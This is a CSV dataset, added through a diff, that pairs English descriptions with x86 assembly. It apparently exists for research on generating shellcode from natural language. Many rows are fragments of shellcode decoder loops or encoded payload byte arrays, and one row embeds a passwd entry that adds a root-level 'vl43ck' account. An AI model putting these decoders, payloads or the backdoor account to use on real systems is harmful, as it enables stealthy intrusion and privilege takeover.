@@ -1,0 +1,306 @@
+raw_nl,temp_nl,raw_code,temp_code
+define the _egg label,define var0 label,_egg :,var0 :
+define the _file label,define var0 label,_file :,var0 :
+define the _param label,define var0 label,_param :,var0 :
+_start function,var0 function,_start :,var0 :
+add 0x40 to the al register,add var0 al register,"add al , 0x40","add al , var0"
+add the value 2 to the contents of the al register,add value 2 contents al register,"add al , 2","add al , 2"
+add the contents of bx into ax,add contents var0 ax,"add ax , bx","add ax , var0"
+add the byte value 2 to the esi register,add byte value 2 var0 register,"add byte [esi] , 2","add byte [var0] , 2"
+add 30 to the single byte stored at memory address var,add 30 single byte stored memory address var,"add byte [var] , 30","add byte [var] , 30"
+add 3 to ecx and jump to L3 if the sum is not zero,add 3 var0 and jump var1 if sum not zero,"add eax , 3 \n jnz L3","add eax , 3 \n jnz var1"
+add decimal 48 to eax,add decimal 48 var0,"add eax , 48","add var0 , 48"
+add the contents of ebx to the contents of eax,add contents var0 contents var1,"add eax , ebx","add var1 , var0"
+add 0x2 to the contents in ebx and save the result in ebx,add var0 contents var1 and save result var1,"add ebx , 0x2","add var1 , var0"
+add the value 1 into the ecx register,add value 1 var0 register,"add ecx , 1","add var0 , 1"
+add 4 to the contents of the esi register,add 4 contents var0 register,"add esi , 4","add var0 , 4"
+call the _myfunc function,call var0 function,call _myfunc,call var0
+call the cont function,call var0 function,call cont,call var0
+call the function decoder,call function decoder,call decoder,call decoder
+call set_argv,call var0,call set_argv,call var0
+call writestring,call var0,call writestring,call var0
+define call_decoder function,define var0 function,call_decoder :,var0 :
+define call_shellcode label,define var0 label,call_shellcode :,var0 :
+define call_shellcode function,define var0 function,call_shellcode :,var0 :
+define the call_write label,define var0 label,call_write :,var0 :
+define the child function,define var0 function,child :,var0 :
+if the contents of the al register is not equal to the contents of the cl register then jump short to the decode label else jump to the shellcode label,if contents al register not equal contents cl register then jump short decode label else jump shellcode label,"cmp al , cl \n jne short decode \n jmp shellcode","cmp al , cl \n jne short decode \n jmp shellcode"
+jump to the l3 label if the contents of the ax register is not equal to the contents of the bx register,jump var0 label if contents ax register not equal contents var1 register,"cmp ax , bx \n jne l3","cmp ax , var1 \n jne var0"
+if the contents of the bl register is equal to the value 0xaa then jump to the shellcode label,if contents var0 register equal value var1 then jump shellcode label,"cmp bl , 0xaa \n je shellcode","cmp var0 , var1 \n je shellcode"
+if the contents of the bl register is equal to the value 0xbb then jump to the xordecode label else jump to the notdecode label,if contents var0 register equal value var1 then jump var2 label else jump var3 label,"cmp bl , 0xbb \n je xordecode \n jmp notdecode","cmp var0 , var1 \n je var2 \n jmp var3"
+if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0x7 then jump to the lowbound label,if byte starting address contained var0 register lower or equal byte value var1 then jump var2 label,"cmp BYTE [esi] , 0x7 \n jle lowbound","cmp BYTE [var0] , var1 \n jle var2"
+if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0xD then jump to the wrap_around label,if byte starting address contained var0 register lower or equal byte value 0xD then jump var1 label,"cmp byte [esi] , 0xD \n jle wrap_around","cmp byte [var0] , 0xD \n jle var1"
+jump to the label loop_1 if the first byte of the esi register is not equal to the contents of the bl register,jump label var0 if first byte var1 register not equal contents var2 register,"cmp BYTE bl , [esi] \n jne loop_1","cmp BYTE var2 , [var1] \n jne var0"
+if the doubleword starting at the address contained in the edx register is equal to the doubleword value 0x636f7270 then jump to the while label,if doubleword starting address contained var0 register equal doubleword value var1 then jump while label,"cmp DWORD [edx] , 0x636f7270 \n je while","cmp DWORD [var0] , var1 \n je while"
+define cycle label,define cycle label,cycle :,cycle :
+in D1 move the current byte of the shellcode in the bl register,in var0 move current byte shellcode var1 register,"D1 : \n mov bl , byte [esi]","var0 : \n mov var1 , byte [esi]"
+declare the function D2 and negate the byte in esi,declare function var0 and negate byte var1,D2 : \n not byte [esi],var0 : \n not byte [var1]
+declare the ruotine D3 and add the value 8 to the current byte of the shellcode,declare var0 var1 and add value 8 current byte shellcode,"D3 : \n add byte [esi] , 8","var1 : \n add byte [esi] , 8"
+define function D3 and subtract 7 from the current byte of the shellcode,var0 function var1 and subtract 7 current byte shellcode,"D3 : \n sub byte [esi] , 7","var1 : \n sub byte [esi] , 7"
+in D4 store the shellcode in edi and move the pointer into esi,in var0 store shellcode var1 and move pointer var2,"D4 : \n pop esi \n mov edi , esi","var0 : \n pop var2 \n mov var1 , var2"
+define the function D4 and perform the xor operation between the byte in esi and the 0x5 value,define function var0 and perform xor operation byte var1 and var2 value,"D4 : \n xor byte [esi] , 0x5","var0 : \n xor byte [var1] , var2"
+decrement the bl register and jump to L1 if the result is zero,decrement var0 register and jump var1 if result zero,dec bl \n jz L1,dec var0 \n jz var1
+decrement the contents of the cl register and jump to the loop_dup label if the result is not negative,decrement contents cl register and jump var0 label if result not negative,dec cl \n jns loop_dup,dec cl \n jns var0
+decrement dl and jump to L3 if the result is not zero,decrement dl and jump var0 if result not zero,dec dl \n jnz L3,dec dl \n jnz var0
+decrement dl and jump to L3 if the result is zero,decrement dl and jump var0 if result zero,dec dl \n jz L3,dec dl \n jz var0
+decrement ebx,decrement var0,dec ebx,dec var0
+decrease ecx by 1,decrease var0 1,dec ecx,dec var0
+decrement esp,decrement esp,dec esp,dec esp
+define decode_pr label,define var0 label,decode_pr :,var0 :
+define decode function,define var0 function,decode :,var0 :
+declare the decode label,declare decode label,decode :,decode :
+define decoded_shellcode function,define var0 function,decoded_shellcode :,var0 :
+define decoder label,define decoder label,decoder :,decoder :
+declare the decrypt label,declare decrypt label,decrypt :,decrypt :
+divide eax by ecx,divide var0 var1,div ecx,div var1
+declare the enc label,declare var0 label,enc :,var0 :
+"define the array of bytes encodedshellcode and initialize it to 0x32,0x51,0x30,0x74,0x69,0x63,0x6f,0xe4,0x8a,0x54,0xe2,0x0c,0x81,0xc1,0x69,0x30,0x69,0x30,0x6a,0x8a,0x51,0xe3,0x8a,0xb1,0xce",define array bytes var0 and initialize it var1,"encodedshellcode : db 0x32 , 0x51 , 0x30 , 0x74 , 0x69 , 0x63 , 0x6f , 0xe4 , 0x8a , 0x54 , 0xe2 , 0x0c , 0x81 , 0xc1 , 0x69 , 0x30 , 0x69 , 0x30 , 0x6a , 0x8a , 0x51 , 0xe3 , 0x8a , 0xb1 , 0xce","var0 : db 0x32 , 0x51 , 0x30 , 0x74 , 0x69 , 0x63 , 0x6f , 0xe4 , 0x8a , 0x54 , 0xe2 , 0x0c , 0x81 , 0xc1 , 0x69 , 0x30 , 0x69 , 0x30 , 0x6a , 0x8a , 0x51 , 0xe3 , 0x8a , 0xb1 , 0xce"
+"define the array of bytes encodedshellcode and initialize it to 0x4e,0xc1,0x51,0x2f,0x58,0x3c,0xdb,0xac,0xef,0x82,0xef,0x1c,0x2a,0xd9,0xdb,0x90,0xdb,0x6b,0xef,0x61,0x3b,0x1c,0xcb,0x24,0xfb,0xd6,0xc5,0x50,0x23,0xfa,0x58,0x9c,0xc5,0xb1,0x33,0x97,0x28,0x31,0xc5,0xaa,0x43,0xf9,0x56,0xf4,0xad,0xc2,0x02,0x16,0x55,0xe3",define array bytes var0 and initialize it var1,"encodedshellcode : db 0x4e , 0xc1 , 0x51 , 0x2f , 0x58 , 0x3c , 0xdb , 0xac , 0xef , 0x82 , 0xef , 0x1c , 0x2a , 0xd9 , 0xdb , 0x90 , 0xdb , 0x6b , 0xef , 0x61 , 0x3b , 0x1c , 0xcb , 0x24 , 0xfb , 0xd6 , 0xc5 , 0x50 , 0x23 , 0xfa , 0x58 , 0x9c , 0xc5 , 0xb1 , 0x33 , 0x97 , 0x28 , 0x31 , 0xc5 , 0xaa , 0x43 , 0xf9 , 0x56 , 0xf4 , 0xad , 0xc2 , 0x02 , 0x16 , 0x55 , 0xe3","var0 : db 0x4e , 0xc1 , 0x51 , 0x2f , 0x58 , 0x3c , 0xdb , 0xac , 0xef , 0x82 , 0xef , 0x1c , 0x2a , 0xd9 , 0xdb , 0x90 , 0xdb , 0x6b , 0xef , 0x61 , 0x3b , 0x1c , 0xcb , 0x24 , 0xfb , 0xd6 , 0xc5 , 0x50 , 0x23 , 0xfa , 0x58 , 0x9c , 0xc5 , 0xb1 , 0x33 , 0x97 , 0x28 , 0x31 , 0xc5 , 0xaa , 0x43 , 0xf9 , 0x56 , 0xf4 , 0xad , 0xc2 , 0x02 , 0x16 , 0x55 , 0xe3"
+declare the encrypt label,declare encrypt label,encrypt :,encrypt :
+define execfile function,define var0 function,execfile :,var0 :
+declare the execute label,declare execute label,execute :,execute :
+define F1 and call the function function_1,define var0 and call function var1,F1 : \n call function_1,var0 : \n call var1
+in the function F1 jump to label L1 if the current byte of the shellcode is lower than 0x1 else subtract 0x1 from the byte of the shellcode and jump to L2,in function var0 jump label var1 if current byte shellcode lower var3 else subtract var3 byte shellcode and jump var6,"F1 : \n cmp byte [esi] , 0x1 \n jl L1 \n sub byte [esi] , 0x1 \n jmp L2","var0 : \n cmp byte [esi] , var3 \n jl var1 \n sub byte [esi] , var3 \n jmp var6"
+in the function F1 point to the next byte in esi,in function var0 point next byte var1,F1 : \n inc esi,var0 : \n inc var1
+in the function F1 point to the next word in esi,in function var0 point next word var1,F1 : \n inc esi \n inc esi,var0 : \n inc var1 \n inc var1
+define F1 function and jump short to L1,define var0 function and jump short var1,F1 : \n jmp short L1,var0 : \n jmp short var1
+in the function F1 negate cl and increment cl to the next byte,in function var0 negate cl and increment cl next byte,F1 : \n not cl \n inc cl,var0 : \n not cl \n inc cl
+"define F1, negate cl and increment cl to the next byte",define var0 negate cl and increment cl next byte,F1 : \n not cl \n inc cl,var0 : \n not cl \n inc cl
+"define F1, negate cl and point to the next byte in the cl register",define var0 negate cl and point next byte cl register,F1 : \n not cl \n inc cl,var0 : \n not cl \n inc cl
+define the function F1 and store the encoded shellcode pointer in the esi register,define function var0 and store encoded shellcode pointer var1 register,F1 : \n pop esi,var0 : \n pop var1
+declare the function F1 and save in esi the pointer to the shellcode,declare function var0 and save var1 pointer shellcode,F1 : \n pop esi,var0 : \n pop var1
+declare the function F1 and point the shellcode in esi,declare function var0 and point shellcode var1,F1 : \n pop esi,var0 : \n pop var1
+in the function F1 point to the next byte of the edi and jump short to L1,in function var0 point next byte var1 and jump short var2,F1 : inc edi \n jmp short L1,var0 : inc var1 \n jmp short var2
+define format label,define format label,format :,format :
+define formatting label,define formatting label,formatting :,formatting :
+declare the four label,declare four label,four :,four :
+declare the get label,declare get label,get :,get :
+declare global _start,declare global var0,global _start,global var0
+increment the contents of the dx register,increment contents var0 register,inc dx,inc var0
+increment the address in eax by one byte,increment address var0 one byte,inc eax,inc var0
+increment eax,increment var0,inc eax,inc var0
+point to the next word in the eax register,point next word var0 register,inc eax \n inc eax,inc var0 \n inc var0
+move to the next word in eax,move next word var0,inc eax \n inc eax,inc var0 \n inc var0
+next instruction in the ecx register,next instruction var0 register,inc ecx,inc var0
+point to the next word in the ecx,point next word var0,inc ecx \n inc ecx,inc var0 \n inc var0
+increment the contents of the edi register,increment contents var0 register,inc edi,inc var0
+increment edx,increment var0,inc edx,inc var0
+point to the next byte in the edx register,point next byte var0 register,inc edx,inc var0
+move to the next double word in the edx register,move next double word var0 register,inc edx \n inc edx \n inc edx \n inc edx,inc var0 \n inc var0 \n inc var0 \n inc var0
+increment esi,increment var0,inc esi,inc var0
+point to the next byte of the encoded shellcode,point next byte encoded shellcode,inc esi,inc esi
+increment to the next byte of the shellcode,increment next byte shellcode,inc esi,inc esi
+point to the next word of the shellcode,point next word shellcode,inc esi \n inc esi,inc esi \n inc esi
+move to the next byte in the shellcode and jump to L2,move next byte shellcode and jump var0,inc esi \n jmp L2,inc esi \n jmp var0
+point to the next byte of the shellcode and jump short to L1,point next byte shellcode and jump short var0,inc esi \n jmp short L1,inc esi \n jmp short var0
+declare inc_dec function,declare var0 function,inc_dec :,var0 :
+jump to the data label,jump data label,jmp data,jmp data
+jump short to the call_decoder label,jump short var0 label,jmp short call_decoder,jmp short var0
+jump short to the function call_shellcode,jump short function var0,jmp short call_shellcode,jmp short var0
+jump short to the call_write label,jump short var0 label,jmp short call_write,jmp short var0
+jump short to the enc label,jump short var0 label,jmp short enc,jmp short var0
+jump short to the get label,jump short get label,jmp short get,jmp short get
+jump short to the main label,jump short main label,jmp short main,jmp short main
+jump short to the output label,jump short output label,jmp short output,jmp short output
+jump short to the shellcode label,jump short shellcode label,jmp short shellcode,jmp short shellcode
+jump short to the three label,jump short three label,jmp short three,jmp short three
+jump to two,jump two,jmp two,jmp two
+jump to 0x86 if the carry flag is zero,jump var0 if carry flag zero,jnc 0x86,jnc var0
+if zero jump to the encoded label,if zero jump encoded label,jz encoded,jz encoded
+declare L4 and jump to the shellcode,declare var0 and jump shellcode,L4 : \n call [esp],var0 : \n call [esp]
+place the value ebx+4*esi in edi,place value var0 var1,"lea edi , [ebx+4*esi]","lea var1 , [var0]"
+load the effective address of the result of the operation [esi + 13] into the edi register,load the effective address of the result of the operation [esi + 13] into the edi register,"lea edi , [esi+13]","lea edi , [esi+13]"
+load the effective address [esi] into edi,load the effective address [esi] into edi,"lea edi , [esi]","lea edi , [esi]"
+point edi to the next byte of the shellcode,point var0 next byte shellcode,"lea edi , [esi+1]","lea var0 , [esi+1]"
+load the effective address [esi+4] into esi,load the effective address [esi+4] into esi,"lea esi , [esi+4]","lea esi , [esi+4]"
+decrement ecx and jumps to the decode label unless decrementing ecx caused its value to become zero,decrement var0 and jumps decode label var2 var3 var0 caused its value become zero,loop decode,loop decode
+decrement the count register and jump to decode if not equal zero,decrement count register and jump decode if not equal zero,loop decode,loop decode
+decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump to the edx register,decrement var0 register and jump decode label if contents var0 register not zero else jump var2 register,loop decode \n jmp edx,loop decode \n jmp var2
+decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump to the EncodedShellcode label,decrement var0 register and jump decode label if contents var0 register not zero else jump var2 label,loop decode \n jmp EncodedShellcode,loop decode \n jmp var2
+decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump to the Shellcode label,decrement var0 register and jump decode label if contents var0 register not zero else jump var2 label,loop decode \n jmp Shellcode,loop decode \n jmp var2
+decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump short to the shellcode label,decrement var0 register and jump decode label if contents var0 register not zero else jump short shellcode label,loop decode \n jmp short shellcode,loop decode \n jmp short shellcode
+decrement ecx and jumps to the decrypt label unless decrementing ecx caused its value to become zero,decrement var0 and jumps decrypt label var2 var3 var0 caused its value become zero,loop decrypt,loop decrypt
+decrement the ecx register and jump to the eggLoop label if the contents of the ecx register is not zero else jump to the edi register,decrement var0 register and jump var2 label if contents var0 register not zero else jump var3 register,loop eggLoop \n jmp edi,loop var2 \n jmp var3
+declare the main_inc label,declare var0 label,main_inc :,var0 :
+declare the main label,declare main label,main :,main :
+move the contents of the al register into the edi register,move contents al register var0 register,"mov [edi] , al","mov [var0] , al"
+move the contents of the al register into the esi register,move contents al register var0 register,"mov [esi] , al","mov [var0] , al"
+move al into the address [esi+13],move al into the address [esi+13],"mov [esi+13] , al","mov [esi+13] , al"
+move the byte at the address [esi] into al,move the byte at the address [esi] into al,"mov al , byte [esi]","mov al , byte [esi]"
+move the byte in esi into the al register,move byte var0 al register,"mov al , byte [esi]","mov al , byte [var0]"
+move the byte at the memory location specified by the operation [esi+1+ebp] into al,move the byte at the memory location specified by the operation [esi+1+ebp] into al,"mov al , byte [esi+1+ebp]","mov al , byte [esi+1+ebp]"
+move a byte from the address esi+ecx into al,move byte address var0 al,"mov al , byte [esi+ecx]","mov al , byte [var0]"
+move cl into al,move cl al,"mov al , cl","mov al , cl"
+move dl into al,move dl al,"mov al , dl","mov al , dl"
+move exit_call into al,move var0 al,"mov al , exit_call","mov al , var0"
+move the contents at the address pointed by esi into the ax register,move contents address pointed var0 ax register,"mov ax , [esi]","mov ax , [var0]"
+move the memory offset table+esi*4 into ax,move memory offset var0 ax,"mov ax , table[esi*4]","mov ax , table[esi*4]"
+move 0x12 into bh,move var0 bh,"mov bh , 0x12","mov bh , var0"
+move 0xe2 into bh,move var0 bh,"mov bh , 0xe2","mov bh , var0"
+move the contents of memory address esi+ecx into bl,move contents memory address var0 var1,"mov bl , [esi+ecx]","mov var1 , [var0]"
+move 0bh into bl,move var0 var1,"mov bl , 0bh","mov var1 , var0"
+move 0xff into bl,move var0 var1,"mov bl , 0xff","mov var1 , var0"
+move 1 into bl,move 1 var0,"mov bl , 1","mov var0 , 1"
+move the byte at the address [eax] into bl,move the byte at the address [eax] into bl,"mov bl , byte [eax]","mov bl , byte [eax]"
+move the byte in edi into bl,move byte var0 var1,"mov bl , byte [edi]","mov var1 , byte [var0]"
+move the byte at the address [edi] into bl,move the byte at the address [edi] into bl,"mov bl , byte [edi]","mov bl , byte [edi]"
+move the byte starting at the address [esi + eax + 1] into the bl register,move the byte starting at the address [esi + eax + 1] into the bl register,"mov bl , byte [esi+eax+1]","mov bl , byte [esi+eax+1]"
+move the byte in esi into bl,move byte var0 var1,"mov bl , byte [esi]","mov var1 , byte [var0]"
+move the byte at the address [esi] into bl,move the byte at the address [esi] into bl,"mov bl , byte [esi]","mov bl , byte [esi]"
+move the byte at the address [esi+ecx+1] into bl,move the byte at the address [esi+ecx+1] into bl,"mov bl , byte [esi+ecx+1]","mov bl , byte [esi+ecx+1]"
+move the byte in esi+ecx+1 into bl,move byte var0 var1,"mov bl , byte [esi+ecx+1]","mov var1 , byte [var0]"
+move the byte 0eh into bl,move byte var0 var1,"mov bl , byte 0eh","mov var1 , byte var0"
+move dl into bl,move dl var0,"mov bl , dl","mov var0 , dl"
+move dl into the byte in eax,move dl byte var0,"mov byte [eax] , dl","mov byte [var0] , dl"
+move al into the byte at address [ebx + 35],move al into the byte at address [ebx + 35],"mov byte [ebx+35] , al","mov byte [ebx+35] , al"
+move the the contents of the bl register into the byte starting at the address in edi,move the contents var0 register byte starting address var1,"mov byte [edi] , bl","mov byte [var1] , var0"
+move bl into the byte at address [edx + eax],move bl into the byte at address [edx + eax],"mov byte [edx+eax] , bl","mov byte [edx+eax] , bl"
+move bl into byte edx+eax,move var0 byte edx+eax,"mov byte [edx+eax] , bl","mov byte [var1] , var0"
+move the contents of dl into the byte at the memory location specified by the operation [esi+1],move the contents of dl into the byte at the memory location specified by the operation [esi+1],"mov byte [esi+1] , dl","mov byte [esi+1] , dl"
+move al into the byte in esi,move al byte var0,"mov byte [esi] , al","mov byte [var0] , al"
+move al into the byte at address [esi+10],move al into the byte at address [esi+10],"mov byte [esi+10] , al","mov byte [esi+10] , al"
+move bl into the byte at address [esi+ecx],move bl into the byte at address [esi+ecx],"mov byte [esi+ecx] , bl","mov byte [esi+ecx] , bl"
+move bl into the single byte at the address stored in esi+ecx,move var0 single byte address stored esi+ecx,"mov byte [esi+ecx] , bl","mov byte [var1] , var0"
+move 0x0a into the byte at address [esp],move 0x0a into the byte at address [esp],"mov byte [esp] , 0x0a","mov byte [esp] , 0x0a"
+move 0x2e into the byte at address [esp],move 0x2e into the byte at address [esp],"mov byte [esp] , 0x2e","mov byte [esp] , 0x2e"
+move 0x4 into ch,move var0 var1,"mov ch , 0x4","mov var1 , var0"
+move 0102 into cl,move 0102 cl,"mov cl , 0102","mov cl , 0102"
+move 0x3 into cl,move var0 cl,"mov cl , 0x3","mov cl , var0"
+move al into cl,move al cl,"mov cl , al","mov cl , al"
+move the byte in eax into cl,move byte var0 cl,"mov cl , byte [eax]","mov cl , byte [var0]"
+move the byte at the address [esi] into cl,move the byte at the address [esi] into cl,"mov cl , byte [esi]","mov cl , byte [esi]"
+move the 3rd element of the array byte_table into cl,move 3rd element array var0 cl,"mov cl , byte_table[2]","mov cl , var0[2]"
+move len into cl,move var0 cl,"mov cl , len","mov cl , var0"
+move 0x35 into dh,move var0 var1,"mov dh , 0x35","mov var1 , var0"
+move 0xff into dh,move var0 var1,"mov dh , 0xff","mov var1 , var0"
+move 0x01 into dl,move var0 dl,"mov dl , 0x01","mov dl , var0"
+move 0x20 into dl,move var0 dl,"mov dl , 0x20","mov dl , var0"
+move 0xff into dl,move var0 dl,"mov dl , 0xff","mov dl , var0"
+move the byte at the memory location specified by the operation [eax+1] into dl,move the byte at the memory location specified by the operation [eax+1] into dl,"mov dl , byte [eax+1]","mov dl , byte [eax+1]"
+move the singl byte at the memory location specified by the operation [esi+1] into dl,move the singl byte at the memory location specified by the operation [esi+1] into dl,"mov dl , byte [esi+1]","mov dl , byte [esi+1]"
+move the single byte in esi into dl,move single byte var0 dl,"mov dl , byte [esi]","mov dl , byte [var0]"
+move the byte 0ffh into dl,move byte var0 dl,"mov dl , byte 0ffh","mov dl , byte var0"
+backup ebx into eax,backup var0 var1,"mov eax , ebx","mov var1 , var0"
+move edi into eax,move var0 var1,"mov eax , edi","mov var1 , var0"
+move esp into ebp,move esp var0,"mov ebp , esp","mov var0 , esp"
+move the contents of memory address ebx+esi into ebx,move contents memory address var0 ebx,"mov ebx , [ebx+esi]","mov ebx , [var0]"
+move 0x2 into ebx,move var0 var1,"mov ebx , 0x2","mov var1 , var0"
+move ebp into ecx,move var0 var1,"mov ecx , ebp","mov var1 , var0"
+move esp into ecx,move esp var0,"mov ecx , esp","mov var0 , esp"
+move the contents of the esp register into the ecx register,move contents esp register var0 register,"mov ecx , esp","mov var0 , esp"
+move 0x3734b117 into edi,move var0 var1,"mov edi , 0x3734b117","mov var1 , var0"
+move 0x978cd0d0 into edi,move var0 var1,"mov edi , 0x978cd0d0","mov var1 , var0"
+move ecx to edi,move var0 var1,"mov edi , ecx","mov var1 , var0"
+move esi into edi,move var0 var1,"mov edi , esi","mov var1 , var0"
+move decimal 78 into edx,move decimal 78 var0,"mov edx , 78","mov var0 , 78"
+move address of stack pointer into edx,move address stack pointer var0,"mov edx , esp","mov var0 , esp"
+move hexlen into edx,move var0 var1,"mov edx , hexlen","mov var1 , var0"
+move the 16-bit integer representation of 2 into the 2 bytes starting at address ecx,move var0 integer representation 2 2 bytes starting address var1,"mov word [ecx] , 2","mov word [var1] , 2"
+multiply eax by ecx,multiply var0 var1,mul ecx,mul var1
+define next_cycle label,define var0 label,next_cycle :,var0 :
+do nothing,do nothing,nop,nop
+perform a bit-wise inversion of the byte starting at the address in esi,perform var0 inversion byte starting address var1,not byte [esi],not byte [var1]
+negate all the bits of the word at the address ax,negate all bits word address ax,not word ax,not word ax
+declare odd_numer function,declare var0 function,odd_number :,odd_number :
+pop the last element pushed onto the stack into cx,pop last element pushed stack cx,pop cx,pop cx
+pop the value on the stack back into edx,pop value stack back var0,pop edx,pop var0
+restore esi from the stack,restore var0 stack,pop esi,pop var0
+restore the top of the stack into esi register,restore top stack var0 register,pop esi,pop var0
+restore the top of the stack into the esi register,restore top stack var0 register,pop esi,pop var0
+pop the top of the stack into the esi register,pop top stack var0 register,pop esi,pop var0
+pop the value on the stack back into esi,pop value stack back var0,pop esi,pop var0
+get the address of shellcode,get address shellcode,pop esi,pop esi
+load address of the encoded shellcode into esi,load address encoded shellcode var0,pop esi,pop var0
+pop the shellcode into esi,pop shellcode var0,pop esi,pop var0
+shellcode address in esi,shellcode address var0,pop esi,pop var0
+shellcode on esi,shellcode var0,pop esi,pop var0
+store the shellcode in the esi register and copy it into ax,store shellcode var0 register and copy it ax,"pop esi \n mov ax , [esi]","pop var0 \n mov ax , [var0]"
+save the encoded shellcode in esi and move it into bx,save encoded shellcode var0 and move it var1,"pop esi \n mov bx , [esi]","pop var0 \n mov var1 , [var0]"
+point esi to the shellcode and save it into cx,point var0 shellcode and save it cx,"pop esi \n mov cx , [esi]","pop var0 \n mov cx , [var0]"
+pop doublewords from the stack into the 32 bit registers,pop var0 stack 32 bit registers,popad,popad
+push esi to the stack,push var0 stack,push esi,push var0
+push the contents of the esi register onto the stack and point ecx to the stack register,push contents var0 register stack and point var1 stack register,"push esi \n mov ecx , esp","push var0 \n mov var1 , esp"
+declare retry label,declare retry label,retry :,retry :
+left rotate the byte in esi 1 time,left rotate byte var0 1 time,"rol byte [esi] , 0x1","rol byte [var0] , 0x1"
+left rotate the edx register 4 times,left rotate var0 register 4 times,"rol edx , 0x4","rol var0 , 0x4"
+right rotate the byte in esi 1 time,right rotate byte var0 1 time,"ror byte [esi] , 0x1","ror byte [var0] , 0x1"
+right rotate esi 1 time,right rotate var0 1 time,"ror esi , 1","ror var0 , 1"
+declare the shell label,declare shell label,shell :,shell :
+define shellcode label,define shellcode label,shellcode :,shellcode :
+define the array of bytes shellcode and initialize it to vl43ck:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:vl43ck:/tmp:/bin/bash,define array bytes shellcode and initialize it var0 var3 SF9aR7ciQBRCcw5bgjX0:0:0:vl43ck:/tmp:/var7,shellcode : db 'vl43ck : $6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm . YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh . SF9aR7ciQBRCcw5bgjX0 : 0 : 0 : vl43ck : /tmp : /bin/bash',"shellcode : db ""vl43ck : $6$bxwJfzor$var2 . var3 . var4 : 0 : 0 : vl43ck : /tmp : /var7"""
+"define shellcode as an array of bytes and initialize it to 0x4b,0xf7,0x13,0x59,0xcc,0x8c,0x63,0x5e,0x9f,0x8d,0x99,0x9f,0x1f,0xa4,0x3b,0x6e,0xc6,0x36,0x23",define shellcode array bytes and initialize it var0,"shellcode : db 0x4b , 0xf7 , 0x13 , 0x59 , 0xcc , 0x8c , 0x63 , 0x5e , 0x9f , 0x8d , 0x99 , 0x9f , 0x1f , 0xa4 , 0x3b , 0x6e , 0xc6 , 0x36 , 0x23","shellcode : db 0x4b , 0xf7 , 0x13 , 0x59 , 0xcc , 0x8c , 0x63 , 0x5e , 0x9f , 0x8d , 0x99 , 0x9f , 0x1f , 0xa4 , 0x3b , 0x6e , 0xc6 , 0x36 , 0x23"
+define shellcodelen equal to the length of shellcode,define var0 equal length shellcode,shellcodelen equ $-shellcode,var0 equ $-shellcode
+define shift_decode label,define var0 label,shift_decode :,var0 :
+multiply the value of eax by 2,multiply value var0 2,"shl eax , 1","shl var0 , 1"
+left shift the contents of eax register by 28 bit positions,left shift contents var0 register 28 bit positions,"shl eax , 28","shl var0 , 28"
+left shift the contents of ebx by 8 bits,left shift contents var0 8 bits,"shl ebx , 8","shl var0 , 8"
+multiply edx by 4 using left shift,multiply var0 4 using left shift,"shl edx , 2","shl var0 , 2"
+right shift ax by 1 bit,right shift ax 1 bit,"shr ax , 1","shr ax , 1"
+right shift the contents of the edi register by the contents of the cl register,right shift contents var0 register contents cl register,"shr ax , cl","shr ax , cl"
+right shift the contents of bl register by 4 bit positions,right shift contents var0 register 4 bit positions,"shr bl , 4","shr var0 , 4"
+right shift the contents of dl register by 1 bit positions,right shift contents dl register 1 bit positions,"shr dl , 1","shr dl , 1"
+right shift the contents of dl register by 4 bit positions,right shift contents dl register 4 bit positions,"shr dl , 4","shr dl , 4"
+shift right dx by the contents of bl and negate the byte in dx,shift right var0 contents var2 and negate byte var0,"shr dx , bl \n not byte dx","shr var0 , var2 \n not byte var0"
+right shift the contents of the eax register by 24 bit positions,right shift contents var0 register 24 bit positions,"shr eax , 24","shr var0 , 24"
+right shift the contents of eax register by 28 bit positions,right shift contents var0 register 28 bit positions,"shr eax , 28","shr var0 , 28"
+right shift the contents of the ebx register by the contents of the cl register,right shift contents var0 register contents cl register,"shr ebx , cl","shr var0 , cl"
+define stage label,define stage label,stage :,stage :
+declare the stageaddress label,declare var0 label,stageaddress :,var0 :
+subtract 13 from ax and save the result into ax,subtract 13 ax and save result ax,"sub ax , 13","sub ax , 13"
+subtract 1564 from the contents of the ax register,subtract 1564 contents ax register,"sub ax , 1564","sub ax , 1564"
+subtract the contents of al register from the contents of bl register and save the result in bl,subtract contents al register contents var0 register and save result var0,"sub bl , al","sub var0 , al"
+subtract 0x7 from the byte in esi register,subtract var0 byte var1 register,"sub bl , byte [esi]","sub bl , byte [var1]"
+subtract the value 3 from the byte in esi and negate it,subtract value 3 byte var0 and negate it,"sub byte [esi] , 3 \n not byte [esi]","sub byte [var0] , 3 \n not byte [var0]"
+subtract the value 1 from the contents of the cl register and jump to the decode label if the result is not zero,subtract value 1 contents cl register and jump decode label if result not zero,"sub cl , 1 \n jnz decode","sub cl , 1 \n jnz decode"
+subtract the contents of dl register from the contents of cl register and save the result in cl,subtract contents dl register contents cl register and save result cl,"sub cl , dl","sub cl , dl"
+subtract the contents of cx from the contents of cx,subtract contents cx contents cx,"sub cx , cx","sub cx , cx"
+subtract the contents of the al register from the contents of the dl register and jump to the decode_pr label if the result is not negative,subtract contents al register contents dl register and jump var0 label if result not negative,"sub dl , al \n jns decode_pr","sub dl , al \n jns var0"
+subtract the contents of bx from the contents of dx,subtract contents var0 contents var1,"sub dx , bx","sub var1 , var0"
+subtract 0x10 from eax,subtract var0 var1,"sub eax , 0x10","sub var1 , var0"
+allocate memory for variable,allocate memory var0 variable,"sub esp , 4","sub esp , 4"
+subtract the byte value 0x1 from esp register and save the result in esp,subtract byte value var0 esp register and save result esp,"sub esp , byte 0x1","sub esp , byte var0"
+if the contents of the eax register is zero then jump to the label socket,if contents var0 register zero then jump label socket,"test eax , eax \n jz socket","test var0 , var0 \n jz socket"
+jump short to the label l1 if the contents of the ebx register is negative,jump short label var0 if contents var1 register negative,"test ebx , ebx \n js short l1","test var1 , var1 \n js short var0"
+test the contents of the edx register,test contents var0 register,"test edx , edx","test var0 , var0"
+swap the contents in ebp+16 and ecx,swap contents var0 and var1,"xchg [ebp+16] , ecx","xchg [var0] , var1"
